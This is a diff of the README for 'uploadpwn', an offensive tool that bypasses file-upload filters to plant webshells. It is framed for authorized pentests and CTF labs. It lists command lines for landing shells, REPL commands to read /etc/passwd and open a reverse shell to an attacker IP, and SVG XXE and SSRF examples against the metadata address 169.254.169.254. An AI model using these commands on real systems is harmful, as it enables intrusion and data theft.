@@ -2,222 +2,97 @@
 
 > Universal file-upload attack tool for authorized penetration tests, HTB/OSCP labs, and CTFs.
 
-[![Tests](https://img.shields.io/badge/tests-82%2F82%20passing-brightgreen)]()
-[![Python](https://img.shields.io/badge/python-3.8%2B-blue)]()
-[![License](https://img.shields.io/badge/license-MIT-lightgrey)]()
+`uploadpwn` is a single-file Python tool. Point it at a target URL and it will
+auto-discover upload endpoints, harvest required form fields, run the full
+bypass matrix (`.htaccess`, polyglots, parser confusion, nginx tricks,
+`web.config`, SVG XXE, race, zip-slip), learn the storage path from the upload
+response, and verify RCE with a nonce-wrapped probe — no false positives.
 
-`uploadpwn` is a single-file Python tool that takes a target URL and tries to land
-a webshell through every known file-upload bypass — `.htaccess` tricks, real image
-polyglots, parser confusion, `web.config` handler hijacks, nginx / PHP-FPM /
-Tomcat path-info quirks, SVG XXE, race conditions, and zip-slip. It auto-discovers
-the upload endpoint, harvests required form fields, learns the storage path from
-the upload response, and verifies RCE with a nonce-wrapped command — **no false
-positives**.
-
-> ⚠️ **Authorized use only.** This tool is for HTB/CTF/lab targets, owned
-> infrastructure, or systems within a written pentest scope. See
-> [`AI_CHECKLIST.md`](./AI_CHECKLIST.md) §0.
+> ⚠️ **Authorized use only.** HTB / CTF / lab targets, owned infrastructure, or
+> systems within a written pentest scope.
 
 ---
 
-## Highlights
-
-- **Auto endpoint discovery** — form scrape, JS bundle scrape, robots/sitemap,
-  OpenAPI, OPTIONS/WebDAV, GraphQL, crawl with configurable depth.
-- **Auto form-field harvesting** — hidden inputs, CSRF tokens, named submit
-  buttons (the canonical `isset($_POST['submit'])` trap), `<select>` defaults.
-- **Real polyglots** — 14 builders (PNG/JPEG-COM/EXIF/ICC, GIF, PDF, ZIP, SVG,
-  DOCX, MP4, MP3, Phar-JPEG, WebP, AVIF) that survive `PIL.verify()`.
-- **32 `.htaccess` / `.user.ini` / `php.ini` tricks** + **8 `web.config`
-  variants** + **12 nginx / FPM / Tomcat tricks** + **19 parser-confusion
-  filename smuggles**.
-- **Zero false-positive RCE verifier** — every shell is confirmed by a fresh
-  nonce echoed twice with content between.
-- **Full auth catalogue** — Basic, Digest, NTLM, Bearer/JWT, API-key, mTLS,
-  multi-step form login, JSON SPA login with rotating CSRF, OTP (`--otp-value`
-  / `--otp-totp-secret` / `--otp-prompt`), CAPTCHA detection.
-- **Burp-style `-r REQUEST_FILE`** to derive method/URL/headers/cookies from
-  a raw HTTP dump.
-- **4-state report** — `RCE_CONFIRMED` / `UPLOAD_ACCEPTED` / `FILTER_BYPASSED` /
-  `FAILED` per audit step, plus per-state counters and SHA-256 of every payload.
-- **Smart `--endpoint` resolver** — accepts any of `/path`, `path`, `host/path`,
-  `host:port/path`, `http(s)://...`, or `//host/path`.
-
----
-
-## Quick start
-
-### Install
+## Install
 
 ```bash
-git clone https://github.com/<you>/uploadpwn.git
+git clone https://github.com/xl337x/uploadpwn.git
 cd uploadpwn
-pip install -r requirements.txt        # requests, beautifulsoup4, pyotp, Pillow
-                                        # (selenium and requests-ntlm are optional)
+pip install -r requirements.txt
 ```
 
-Or minimal install — `uploadpwn.py` is a single file and only hard-needs
-`requests`. Everything else degrades gracefully if missing.
+**Requirements:** Python 3.8+. Hard deps: `requests`. Soft deps:
+`beautifulsoup4` (form scraping), `pyotp` (TOTP auth), `Pillow` (polyglot
+validation). Optional: `selenium` (`--login-method selenium`),
+`requests-ntlm` (`--ntlm-auth`).
 
-### 60-second demo
+Sanity check:
 
 ```bash
-python uploadpwn.py -t http://10.10.11.42 --i-am-authorized
+python uploadpwn.py --help
+pytest -q                 # 82/82 tests should pass
 ```
 
-That's it. The tool will:
+---
 
-1. Probe `/`, fingerprint the stack (server / language / OS).
-2. Discover upload endpoints from the page's forms, JS bundles, robots, sitemap,
-   OpenAPI, OPTIONS, and a small brute-force list.
-3. Auto-harvest hidden form fields (`csrf_token`, `__VIEWSTATE`,
-   `submit=Purchase`, etc.).
-4. Run the bypass matrix cheapest-first: `.htaccess` → polyglots →
-   parser-confusion → nginx tricks → `web.config` → full
-   filename×content-type×shell matrix.
-5. On a successful upload, verify RCE with a nonce-wrapped probe.
+## Usage
+
+### The simplest run
+
+```bash
+python uploadpwn.py -t http://TARGET --i-am-authorized
+```
+
+That single command will:
+
+1. Probe `/` and fingerprint the stack (server / language / OS).
+2. Discover upload endpoints from forms, JS bundles, `robots.txt`, `sitemap.xml`,
+   OpenAPI, OPTIONS/WebDAV, GraphQL, and a small brute-force list.
+3. Auto-harvest hidden form fields (CSRF tokens, `__VIEWSTATE`, named submit
+   buttons like `submit=Purchase`, `<select>` defaults).
+4. Run the bypass matrix cheapest-first: `.htaccess` → polyglots → parser
+   confusion → nginx tricks → `web.config` → full filename×CT×shell matrix.
+5. On any accepted upload, verify RCE with a nonce-wrapped `id`.
 6. Print a structured report and write `uploadpwn_report.json`.
 
-Sample output:
+### Flags grouped by what they do
 
-```
-[*] PROBE: Fingerprinting active filters...
-  [BYPASSED] filter: 'Content-Type Filter' bypassed via: spoof to image/jpeg
-  [BYPASSED] filter: 'Extension Filter' bypassed via: null byte: shell.php%00.jpg
-[*] MODULE 2: .htaccess / .user.ini / php.ini  (32 tricks)
-[✓] trick 1/32: addtype_jpg (.htaccess) accepted
-  [BYPASSED] filter: '.htaccess' bypassed via: addtype_jpg
-[!!!] RCE CONFIRMED!
+#### Target & endpoint
 
-╔═══════════════════════════════════════════════╗
-║  ✓  SHELL IS LIVE                             ║
-╠═══════════════════════════════════════════════╣
-║  URL    : http://10.10.11.42/uploads/shell.jpg║
-║  Param  : cmd                                 ║
-╚═══════════════════════════════════════════════╝
-```
+| Flag                           | Purpose                                                                  |
+|--------------------------------|--------------------------------------------------------------------------|
+| `-t, --target URL`             | Target base URL. Required unless `-r` supplies it.                       |
+| `-r, --request FILE`           | Burp / raw HTTP request file (sqlmap-style).                             |
+| `--https`                      | Force HTTPS when `-r` is used.                                           |
+| `-e, --endpoint EP`            | Upload endpoint. Auto-detected if omitted. **Smart resolver — see below.** |
+| `--field NAME`                 | File-upload field name. Auto-detected if omitted.                        |
+| `--extra-field NAME=VALUE`     | Add a multipart field to every upload. Repeatable.                       |
+| `--shell-dirs DIR [DIR ...]`   | Override the 17-dir storage brute list.                                  |
+| `--cmd-param NAME`             | Webshell command parameter name (default `cmd`).                         |
+| `--flag PATH`                  | File to read after RCE (default `/flag.txt`).                            |
 
----
+The `--endpoint` flag accepts six shapes. Use whichever you typed:
 
-## Common scenarios
+| `-t` (target)         | `-e` (endpoint)                | Resolves to                                  |
+|-----------------------|--------------------------------|----------------------------------------------|
+| `http://10.0.0.1`     | `/upload.php`                  | `http://10.0.0.1/upload.php`                 |
+| `http://10.0.0.1`     | `upload.php`                   | `http://10.0.0.1/upload.php`                 |
+| `http://10.0.0.1`     | `http://other.tld/u.php`       | `http://other.tld/u.php` (target swaps)      |
+| `http://10.0.0.1`     | `other.tld/u.php`              | `http://other.tld/u.php` (inherits scheme)   |
+| `https://10.0.0.1`    | `other.tld:9000/u.php`         | `https://other.tld:9000/u.php`               |
+| `https://10.0.0.1`    | `//other.tld/u.php`            | `https://other.tld/u.php`                    |
 
-### HTB-style box with a public upload form
+When the endpoint points to a different host than `-t`, the effective target
+swaps automatically — the banner tells you it happened.
 
-```bash
-python uploadpwn.py -t http://10.10.11.42 --i-am-authorized --interactive
-```
+#### Authorization gate
 
-Drops you into an interactive webshell on RCE. The REPL supports
-`!read /etc/passwd`, `!find /var/www -name '*.php'`, `!revshell IP PORT`,
-`!loot`.
+| Flag                  | Purpose                                                                  |
+|-----------------------|--------------------------------------------------------------------------|
+| `--i-am-authorized`   | Operator asserts authorization. Stamps the audit log. Always pass this.  |
+| `--captcha-prompt`    | When CAPTCHA is detected on the login page, surface it and pause for replay. |
 
-### Authenticated upload behind a login
-
-```bash
-python uploadpwn.py \
-  -t http://target.com \
-  --login /login.php --user admin --pass hunter2 \
-  --upload-page /dashboard \
-  --i-am-authorized
-```
-
-Handles CSRF tokens, multi-step wizards (login → 2FA → dashboard), and
-session-expiry mid-scan (`--relogin-on-expiry`).
-
-### SPA with JSON login and rotating CSRF
-
-```bash
-python uploadpwn.py \
-  -t https://api.target.com \
-  --json-login /api/v1/auth/login --user admin --pass hunter2 \
-  --token-path access_token --csrf-path next_csrf \
-  --csrf-header X-CSRF-Token \
-  --i-am-authorized
-```
-
-### Re-using a Burp request
-
-```bash
-python uploadpwn.py -r burp_request.txt --i-am-authorized
-```
-
-`uploadpwn` parses Burp's raw-request export (`POST /upload HTTP/1.1\nHost:
-…\n\n…`), extracts the URL, headers, cookies, file field name, and body.
-
-### Driving every discovered endpoint
-
-```bash
-python uploadpwn.py -t http://target.com --attack-all --i-am-authorized
-# or, to NOT stop on first RCE (full coverage map):
-python uploadpwn.py -t http://target.com --attack-all --exhaust --i-am-authorized
-```
-
-### Targeted module + safety knobs
-
-```bash
-python uploadpwn.py -t http://target.com \
-  --htaccess \
-  --delay 0.5 --jitter 0.2 --rate-limit 5 \
-  --request-budget 1000 \
-  --waf-pause 5 \
-  --i-am-authorized
-```
-
-### Clean up after yourself
-
-```bash
-python uploadpwn.py -t http://target.com --all --cleanup --i-am-authorized
-```
-
-On exit, every uploaded `.htaccess` / `.user.ini` / `web.config` / shell
-artifact is deleted — via HTTP `DELETE` first, then `rm`/`del` through the
-confirmed webshell if the server rejects `DELETE` (most do).
-
----
-
-## The `--endpoint` flag — smart resolver
-
-You can pass `--endpoint` in any shape the operator might type:
-
-| `-t` (target)            | `-e` (endpoint)                       | Resolved upload URL                          |
-|--------------------------|---------------------------------------|----------------------------------------------|
-| `http://10.0.0.1`        | `/upload.php`                         | `http://10.0.0.1/upload.php`                 |
-| `http://10.0.0.1`        | `upload.php`                          | `http://10.0.0.1/upload.php`                 |
-| `http://10.0.0.1`        | `http://other.tld/u.php`              | `http://other.tld/u.php` (target swaps)      |
-| `http://10.0.0.1`        | `other.tld/u.php`                     | `http://other.tld/u.php` (inherits scheme)   |
-| `https://10.0.0.1`       | `other.tld:9000/u.php`                | `https://other.tld:9000/u.php`               |
-| `https://10.0.0.1`       | `//other.tld/u.php`                   | `https://other.tld/u.php`                    |
-
-When the endpoint points to a different host than `-t`, the **effective target**
-swaps automatically (banner shows the change) — so storage-path discovery and
-brute-force fallbacks aim at the right host.
-
----
-
-## Full flag reference
-
-### Target & endpoint
-
-| Flag                          | What it does                                                              |
-|-------------------------------|---------------------------------------------------------------------------|
-| `-t, --target URL`            | Target base URL. Required unless `-r` supplies it.                        |
-| `-r, --request FILE`          | Burp / raw HTTP request file (sqlmap-style).                              |
-| `--https`                     | Force HTTPS when `-r` is used.                                            |
-| `-e, --endpoint EP`           | Upload endpoint (any of the 6 shapes above; auto-detected if omitted).    |
-| `--field NAME`                | File-upload field name (auto-detected if omitted).                        |
-| `--extra-field NAME=VALUE`    | Add a multipart field to every upload. Repeatable.                        |
-| `--shell-dirs DIR [...]`      | Override the 17-dir storage brute list.                                   |
-| `--cmd-param NAME`            | Webshell command parameter name (default `cmd`).                          |
-| `--flag PATH`                 | File to read after RCE (default `/flag.txt`).                             |
-
-### Authorization gate (HARD)
-
-| Flag                  | What it does                                                                  |
-|-----------------------|-------------------------------------------------------------------------------|
-| `--i-am-authorized`   | Operator asserts authorization. Stamps the audit log. **Required** for clean runs. |
-| `--captcha-prompt`    | Surface a CAPTCHA gate to the operator; pauses for cookie replay.            |
-
-### Authentication
+#### Authentication
 
 | Flag                                              | Use case                                  |
 |---------------------------------------------------|-------------------------------------------|
@@ -242,9 +117,9 @@ brute-force fallbacks aim at the right host.
 | `--otp-url PATH`                                  | Explicit `/verify-otp` page               |
 | `--relogin-on-expiry`                             | Re-run login if session dies mid-scan     |
 
-### Transport
+#### Transport
 
-| Flag                          | What it does                                                            |
+| Flag                          | Purpose                                                                 |
 |-------------------------------|-------------------------------------------------------------------------|
 | `--proxy URL`                 | Proxy (e.g. Burp at `http://127.0.0.1:8080`).                           |
 | `-k, --insecure`              | Disable TLS verification.                                               |
@@ -260,14 +135,14 @@ brute-force fallbacks aim at the right host.
 | `--threads N`                 | Concurrent workers for the matrix.                                      |
 | `--user-agent STR`            | Override the User-Agent.                                                |
 
-### Modules
+#### Modules
 
-| Flag                          | Module                                                                  |
+| Flag                          | What it runs                                                            |
 |-------------------------------|-------------------------------------------------------------------------|
 | `--all`                       | Run every module.                                                       |
 | `--matrix`                    | Full filename × shell × content-type matrix (default if nothing else).  |
 | `--htaccess`                  | 32 `.htaccess` / `.user.ini` / `php.ini` tricks.                        |
-| `--polyglots`                 | 14 real polyglot images.                                                |
+| `--polyglots`                 | 14 real polyglot images (PNG/JPEG/GIF/PDF/ZIP/SVG/Phar/WebP/AVIF/...).  |
 | `--parser-confusion`          | 19 filename + Content-Disposition smuggles.                             |
 | `--nginx-tricks`              | 12 nginx / FPM / Tomcat / Jetty path-info tricks.                       |
 | `--webconfig`                 | 8 IIS `web.config` handler-hijack variants.                             |
@@ -287,50 +162,180 @@ brute-force fallbacks aim at the right host.
 | `--max-pages N`               | Discovery crawl page cap (default 20).                                  |
 | `--no-probe`                  | Skip filter fingerprinting.                                             |
 
-### Output
+#### Output
 
-| Flag                        | What it does                                                              |
-|-----------------------------|---------------------------------------------------------------------------|
-| `--interactive`             | Drop into the webshell REPL on RCE.                                       |
-| `-v, --verbose`             | Verbose per-attempt logging.                                              |
-| `-o, --output FILE`         | JSON report path (default `uploadpwn_report.json`).                       |
+| Flag                        | Purpose                                                                  |
+|-----------------------------|--------------------------------------------------------------------------|
+| `--interactive`             | Drop into the webshell REPL on RCE.                                      |
+| `-v, --verbose`             | Verbose per-attempt logging.                                             |
+| `-o, --output FILE`         | JSON report path (default `uploadpwn_report.json`).                      |
 
 ---
 
-## Report schema
+## Scenarios end-to-end
 
-`uploadpwn_report.json` is the source of truth. Every action goes here:
+### 1. HTB-style box with a public upload form
 
-```json
-{
-  "tool": "uploadpwn",
-  "version": "5.0.0",
-  "target": "http://10.10.11.42",
-  "start": "2026-05-12T14:37:22",
-  "end":   "2026-05-12T14:38:11",
-  "filters": {"Content-Type Filter": "bypassed", ".htaccess": "bypassed", ...},
-  "rce": [
-    {"file": "shell.jpg", "url": "http://10.10.11.42/uploads/shell.jpg",
-     "output": "uid=33(www-data) gid=33(www-data) ...",
-     "shell": "standard", "ct": "image/jpeg"}
-  ],
-  "outcomes": {
-    "RCE_CONFIRMED": 1,
-    "UPLOAD_ACCEPTED": 1,
-    "FILTER_BYPASSED": 4,
-    "FAILED": 0
-  },
-  "artifacts": [],          // emptied by --cleanup
-  "steps": [
-    {"ts": "...", "category": "RCE", "status": "found",
-     "detail": "RCE via 'shell.jpg' shell=standard",
-     "extra": {"url": "..."}, "state": "RCE_CONFIRMED",
-     "target": "http://10.10.11.42/uploads/shell.jpg",
-     "payload_sha256": "..."}
-  ],
-  "suggestions": ["Use .phtml, .pht, .php5 to bypass blacklist", ...]
-}
+```bash
+python uploadpwn.py -t http://10.10.11.42 --i-am-authorized --interactive
 ```
+
+Drops into an interactive webshell on RCE. The REPL supports:
+
+```
+!read /etc/passwd          # cat
+!ls /var/www               # list a dir
+!find /var/www -name '*.php'
+!revshell 10.10.14.7 4444  # generates a one-liner
+!loot                      # auto-collect /etc/passwd, crons, SUID
+```
+
+### 2. Authenticated upload behind a login
+
+```bash
+python uploadpwn.py \
+  -t http://target.com \
+  --login /login.php --user admin --pass hunter2 \
+  --upload-page /dashboard \
+  --i-am-authorized
+```
+
+Handles CSRF tokens, multi-step wizards (login → 2FA → dashboard), and
+session-expiry mid-scan (add `--relogin-on-expiry`).
+
+### 3. SPA with JSON login and rotating CSRF
+
+```bash
+python uploadpwn.py \
+  -t https://api.target.com \
+  --json-login /api/v1/auth/login --user admin --pass hunter2 \
+  --token-path access_token --csrf-path next_csrf \
+  --csrf-header X-CSRF-Token \
+  --i-am-authorized
+```
+
+`--token-path` pulls the token out of the JSON response (`{"access_token": "..."}`)
+and pins it as `Authorization: Bearer <token>`. `--csrf-path` rotates the CSRF
+header on every response.
+
+### 4. Re-using a Burp request
+
+Export the upload request from Burp (Right-click → Copy → Copy as raw),
+save it as `burp.txt`, then:
+
+```bash
+python uploadpwn.py -r burp.txt --i-am-authorized
+```
+
+Everything (URL, headers, cookies, file field, body parameters) is derived
+from the dump. Add `-t` only to retarget; CLI flags override individual fields.
+
+### 5. OTP / 2FA login
+
+```bash
+# TOTP — auto-generates the code
+python uploadpwn.py -t http://target.com \
+  --login /login --user alice --pass hunter2 \
+  --otp-totp-secret JBSWY3DPEHPK3PXP \
+  --i-am-authorized
+
+# Prompt operator at runtime
+python uploadpwn.py -t http://target.com \
+  --login /login --user alice --pass hunter2 \
+  --otp-prompt \
+  --i-am-authorized
+```
+
+### 6. CAPTCHA on the login page
+
+```bash
+python uploadpwn.py -t http://target.com \
+  --login /login --user alice --pass hunter2 \
+  --captcha-prompt --i-am-authorized
+```
+
+The tool detects reCAPTCHA / hCaptcha / Turnstile, pauses, and tells you to
+solve it in a browser and replay the session cookie via `--cookie`.
+
+### 7. Multi-endpoint sites — drive every upload
+
+```bash
+# Stop on first RCE
+python uploadpwn.py -t http://target.com --attack-all --i-am-authorized
+
+# Map every viable bypass on every endpoint (no early-exit)
+python uploadpwn.py -t http://target.com --attack-all --exhaust --i-am-authorized
+```
+
+### 8. Endpoint discovery only — no attacks fired
+
+```bash
+python uploadpwn.py -t http://target.com --discover-only --i-am-authorized
+```
+
+Prints a ranked list of every endpoint discovered (form, JS, robots, sitemap,
+OpenAPI, OPTIONS, GraphQL, brute) with confidence scores.
+
+### 9. Quiet / throttled run for WAFed targets
+
+```bash
+python uploadpwn.py -t http://target.com \
+  --delay 1.0 --jitter 0.5 \
+  --rate-limit 2 \
+  --request-budget 800 \
+  --waf-pause 10 \
+  --i-am-authorized
+```
+
+`--delay 1.0 --jitter 0.5` → 0.5–1.5s between requests.
+`--rate-limit 2` → never exceed 2 RPS.
+`--waf-pause 10` → on every WAF fingerprint, sleep 10s once before continuing.
+`--request-budget 800` → abort with exit code 4 if 800 requests are spent
+without success.
+
+### 10. Single module + verbose tracing
+
+```bash
+python uploadpwn.py -t http://target.com --htaccess -v --i-am-authorized
+```
+
+Skip the matrix entirely; just try the 32 `.htaccess` tricks. Useful when you
+already know Apache + PHP-FPM is in scope.
+
+### 11. SVG-based attacks
+
+```bash
+# Read a file via SVG XXE
+python uploadpwn.py -t http://target.com --svg-read /flag.txt --i-am-authorized
+
+# Read PHP source via SVG XXE
+python uploadpwn.py -t http://target.com --svg-src upload.php --i-am-authorized
+
+# SSRF via SVG
+python uploadpwn.py -t http://target.com --svg-ssrf http://169.254.169.254/ --i-am-authorized
+```
+
+### 12. Clean up after the engagement
+
+```bash
+python uploadpwn.py -t http://target.com --all --cleanup --i-am-authorized
+```
+
+Every uploaded `.htaccess` / `.user.ini` / `web.config` / shell artifact is
+removed. Strategy: HTTP DELETE on every learned served URL first; if that
+fails (most servers 405 on DELETE), `rm` / `del` through the confirmed
+webshell.
+
+### 13. Proxy everything through Burp
+
+```bash
+python uploadpwn.py -t http://target.com \
+  --proxy http://127.0.0.1:8080 \
+  -k \
+  --i-am-authorized
+```
+
+`-k` disables TLS verification (you'll need it for Burp's CA on HTTPS).
 
 ---
 
@@ -340,81 +345,41 @@ brute-force fallbacks aim at the right host.
 |------|----------------------------------------------------------------------|
 | `0`  | RCE confirmed, or `--discover-only` completed.                       |
 | `1`  | Run finished without RCE. Some uploads may have been accepted.       |
-| `2`  | Authentication failed, CAPTCHA without `--captcha-prompt`, etc.      |
+| `2`  | Auth failed, CAPTCHA without `--captcha-prompt`, mass-target refused.|
 | `3`  | Network unreachable / connection error.                              |
 | `4`  | `--request-budget` exhausted.                                        |
 | `130`| Interrupted by operator (Ctrl-C).                                    |
 
 ---
 
-## How verification works (no false positives)
+## Report
 
-Every RCE claim is nonce-wrapped:
+`uploadpwn_report.json` is written on every run:
 
+```json
+{
+  "tool": "uploadpwn",
+  "version": "5.0.0",
+  "target": "http://10.10.11.42",
+  "start": "...",
+  "end":   "...",
+  "filters": {"Content-Type Filter": "bypassed", ".htaccess": "bypassed"},
+  "rce":      [{"file": "shell.jpg", "url": "...", "output": "uid=33(www-data)..."}],
+  "outcomes": {
+    "RCE_CONFIRMED":   1,
+    "UPLOAD_ACCEPTED": 1,
+    "FILTER_BYPASSED": 4,
+    "FAILED":          0
+  },
+  "artifacts": [],
+  "steps": [
+    {"ts":"...", "category":"RCE", "status":"found",
+     "state":"RCE_CONFIRMED", "target":"http://.../shell.jpg",
+     "payload_sha256":"..."}
+  ],
+  "suggestions": ["Use .phtml, .pht, .php5 to bypass blacklist"]
+}
 ```
-echo <16-hex-nonce>; id; echo <same-nonce>
-```
 
-The verifier accepts the response **only if** the nonce appears twice with
-content between the two occurrences. Substring matches on `uid=`, `root`,
-`/bin`, or `GIF89a` alone never count. See [`AI_CHECKLIST.md`](./AI_CHECKLIST.md)
-§7 for the full honesty bar.
-
----
-
-## Tests
-
-```bash
-pytest -q
-# 82 passed in ~7s
-```
-
-The suite covers:
-
-- 60 original tests (auth flows, transport quirks, multi-endpoint behavior,
-  discovery sources, payload catalogues).
-- 13 checklist-v2 tests (request budget, rate-limit spacing, payload hashing,
-  outcome state counters, artifact tracking, cleanup deletion, CAPTCHA regex,
-  17-dir shell list).
-- 9 endpoint-shape tests (`smart_endpoint` parametrized).
-
----
-
-## Files
-
-| File                  | Purpose                                                              |
-|-----------------------|----------------------------------------------------------------------|
-| `uploadpwn.py`        | Main tool — single file, runs on Python 3.8+.                        |
-| `uploadpwnAI.py`      | AI-driven variant (operator-prompt → automated plan execution).      |
-| `polyglots.py`        | 14 real polyglot file builders.                                      |
-| `AI_CHECKLIST.md`     | The operating spec — every assertion the tool must satisfy.          |
-| `IMPROVEMENTS.md`     | Field-trial findings & prioritized backlog.                          |
-| `tests/`              | Pytest suite (mock targets + assertions).                            |
-
----
-
-## Contributing
-
-New bypass = new entry in the catalogue **plus** a new pytest case. Both, same PR.
-The catalogue counts are pinned by tests (≥30 htaccess, ≥8 webconfig, ≥12 nginx,
-≥18 parser-confusion, ≥14 polyglots) — a refactor that shrinks any of them
-fails CI.
-
----
-
-## License
-
-MIT. See [LICENSE](./LICENSE).
-
----
-
-## Acknowledgments
-
-Built for HTB / OSCP-style boxes and authorized engagements. Standing on the
-shoulders of:
-
-- [BlackFan/sec-research](https://github.com/BlackFan/) — `.htaccess` magic
-- [orangetsai](https://blog.orange.tw/) — nginx/IIS parser confusion
-- [Synacktiv](https://www.synacktiv.com/) — Phar / polyglot exploitation
-- The HackTricks crew — comprehensive bypass catalogue
-- Every CTF organizer who put an upload form on the box
+Every RCE in the report is nonce-verified. The tool never prints
+`RCE_CONFIRMED` on a substring match.
